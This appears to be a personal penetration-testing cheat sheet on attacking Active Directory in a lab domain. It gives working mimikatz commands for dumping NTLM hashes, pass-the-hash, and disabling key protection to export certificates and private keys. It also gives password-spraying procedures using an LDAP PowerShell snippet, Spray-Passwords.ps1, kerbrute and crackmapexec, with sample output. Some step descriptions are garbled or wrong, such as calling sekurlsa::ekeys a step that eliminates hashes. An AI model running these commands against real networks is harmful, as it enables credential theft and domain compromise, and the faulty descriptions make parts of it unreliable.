# AD Attacking

By default, the NTDS file (NTDS.dit) is located in %SystemRoot%\NTDS\Ntds.dit of a domain controller.

## NTLM Active Directory Authentication

Scenario (still working):

* The client is authenticating to a server using an IP address
* The client is authenticating to a server that belongs to a different Active Directory forest that has a legacy NTLM trust instead of a transitive inter-forest trust
* The client is authenticating to a server that doesn't belong to a domain
* No Active Directory domain exists (commonly referred to as "workgroup" or "peer-to-peer")
* Where a firewall would otherwise restrict the ports required by Kerberos (typically TCP 88)

## Kerberos Active Directory Authentication with NTLM pass-the-hash

Scenario:

* **Limitation**: Requires Windows NTLM has been stolen
* Use mimikatz module [sekurlsa](https://github.com/gentilkiwi/mimikatz/wiki/module-~-sekurlsa)
* Run sekurlsa::pth to insert NTLM into the windows memory
* Run sekurlsa::ekeys to elimiminate all HTLM hashes
* Connect via SMB to create Kerberos Ticket
* List Kerberos Tickets
* From [Duckwall-Abusing-Microsoft-Kerberos](https://www.blackhat.com/docs/us-14/materials/us-14-Duckwall-Abusing-Microsoft-Kerberos-Sorry-You-Guys-Don't-Get-It-wp.pdf)

```powershell
mimekatz# 
privilege::debug

# Use mimikatz sekurlsa::loggonpasswords to dump a list of logged-on users NTLM hashs
sekurlsa::logonpasswords

# Use mimikatz sekurlsa::pth to insert NTLM into the windows memory
sekurlsa::pth /user:Administrator /domain:example.com /ntlm:8846F7EAEE8FB117AD06BDD830B7586D
sekurlsa::ekeys

# open SMB share the issue a ticket
dir \\web.example.com\share

# Show Keberos ticket with mimikatz
mimikatz#
sekurlsa::tickets

Session           : RemoteInteractive from 2
User Name         : jeff
Domain            : CORP
Logon Server      : DC1
Logon Time        : 9/26/2025 5:35:45 AM
SID               : S-1-5-21-1987370270-658905905-1781884369-1105

         * Username : jeff
         * Domain   : CORP.COM
         * Password : (null)

        Group 0 - Ticket Granting Service
         [00000000]
           Start/End/MaxRenew: 9/26/2025 7:32:22 AM ; 9/26/2025 3:35:45 PM ; 10/3/2025 5:35:45 AM
           Service Name (02) : cifs ; web04.corp.com ; @ CORP.COM
           Target Name  (02) : cifs ; web04.corp.com ; @ CORP.COM
           Client Name  (01) : jeff ; @ CORP.COM
           Flags 40a10000    : name_canonicalize ; pre_authent ; renewable ; forwardable ;
```

## Extract AD Certificates and Private Keys

* Use mimikatz to patch disable key protection
* Run crypto::capi to patch [CryptoAPI](https://github.com/gentilkiwi/mimikatz/wiki/module-~-crypto#capi)
* Run crypto::cng to patch [KeyIso](https://github.com/gentilkiwi/mimikatz/wiki/module-~-crypto#cng)
* Run crypto::stores to list [systemstores](https://github.com/gentilkiwi/mimikatz/wiki/module-~-crypto#stores)
* Run crypto::certificates to extract [certificates](https://github.com/gentilkiwi/mimikatz/wiki/module-~-crypto#certificates)
* Run crypto::keys to extract [private keys](https://github.com/gentilkiwi/mimikatz/wiki/module-~-crypto#keys)
* User openssl to convert PVK (it an RSA key) into PEM Format

```powershell
mimikatz# 
privilege::debug

# Disable private key protection
crypto::capi
Local "CryptoAPI" patched
crypto::cng
"KeyIso" service patched

# List crypto stores
crypto::stores /systemstore:local_machine

# Extract certificates and private keys from local machine
crypto::certificates /systemstore:local_machine /store:my /export
crypto::keys /export

# Convert PVK into PEM
openssl rsa -inform pvk -in key.pvk -outform pem -out key.pem
```

## Attacks on Active Directory Authentication

## AD Password Spraying via LDAP

```shell
net accounts

Lockout threshold:                                    5
Lockout duration (minutes):                           30
Lockout observation window (minutes):                 30
```

```powershell
$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
$PDC = ($domainObj.PdcRoleOwner).Name
$SearchString = "LDAP://" + $PDC + "/"
$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"
$SearchString += $DistinguishedName
New-Object System.DirectoryServices.DirectoryEntry($SearchString, "mary", "Secr3t")

# Success
distinguishedName : {DC=corp,DC=com}
Path              : LDAP://DC1.corp.com/DC=corp,DC=com

# Wrong Password
format-default : The following exception occurred while retrieving member "distinguishedName": 
"The user name or password is incorrect.

```

## Automate AD Password Spraying via LDAP with Spray-Passwords.ps1

Features

* Query net accounts to avoid lockout
* Query net users to find all users
* Options
* -Pass Allows to provide a password
* -File Allows to provide a wordlist
* -Admin Tests for admin accounts too

```powershell
cd tools
powershell -ep bypass
.\Spray-Passwords.ps1 -Pass 'Secr3t' -Admin
```

## AD Password Spraying with Kerbrute

Feature

* Download [kerbrute](https://github.com/ropnop/kerbrute/releases/tag/v1.0.3)
* Cross-platform for Linux and Windows and Mac
* bruteuser - Bruteforce a single user's password from a wordlist
* bruteforce - Read username:password combos from a file or stdin and test them
* userenum - Enumerate valid domain usernames via Kerberos
* passwordspray - Test a single password against a list of users

```bash
cd tools
.\kerbrute_windows_amd64.exe userenum -d corp.com .\usernames.txt

2025/09/26 08:54:44 >   dc1.corp.com:88
2025/09/26 08:54:44 >  [+] VALID USERNAME:       jeff@corp.com
2025/09/26 08:54:44 >  [+] VALID USERNAME:       dave@corp.com

.\kerbrute_windows_amd64.exe passwordspray -d corp.com .\usernames.txt "Nexus123!"

2025/09/26 08:56:56 >   dc1.corp.com:88
2025/09/26 08:56:56 >  [+] VALID LOGIN:  jeff@corp.com:Nexus123!
```

The **wordlist usernames.txt MUST be ANSI encoded**. Otherwise you get a network error.

## AD Password Spraying with CrackMap

Scenario

* AD Credential have been leaked without user name
* Use `crackmapexec` for password spraying attack

```bash
# IP Range
crackmapexec smb 192.168.226.70-76 -u /tmp/users.txt -p 'Nexus123!' -d corp.com --continue-on-success

SMB         192.168.226.75  445    CLIENT75         [*] Windows 11 Build 22000 x64 (name:CLIENT75) (domain:corp.com) (signing:False) (SMBv1:False)
SMB         192.168.226.75  445    CLIENT75         [-] corp.com\dave:Secr3t! STATUS_LOGON_FAILURE 
SMB         192.168.226.75  445    CLIENT75         [+] corp.com\jeff:Secr3t! (Pwn3d!)
SMB         192.168.226.75  445    CLIENT75         [-] corp.com\mary:Secr3t! STATUS_LOGON_FAILURE 

```